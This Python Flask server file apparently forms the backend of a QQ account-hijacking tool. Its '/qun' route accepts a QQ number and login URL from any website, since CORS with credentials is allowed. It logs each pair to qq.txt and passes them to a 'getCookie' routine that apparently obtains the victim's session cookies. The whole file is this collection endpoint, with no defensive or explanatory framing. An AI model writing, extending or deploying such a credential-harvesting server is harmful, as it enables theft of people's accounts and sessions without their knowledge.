# -*- coding:utf-8 -*-
from flask import Flask, request, redirect
from flask_cors import *
from qx import qqLogin
from getCookie import Tool
import time

app = Flask(__name__)
CORS(app, supports_credentials=True)


# @app.route('/', methods=['POST', 'GET'])
# def index():
#     Tool.getQq(request.form.get('uin'), request.form.get('url'))
#     return ''



@app.route('/qun', methods=['POST', 'GET'])
def qun():
    print(request.form)
    try:
        with open('qq.txt', 'a')as f:
            f.write(request.form.get('uin') + '|' + request.form.get('url') + '\n')
        qqLogin.getCookie(request.form.get('uin'), request.form.get('url'))
    except Exception as e:
        print(e)
    return ''

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5002)
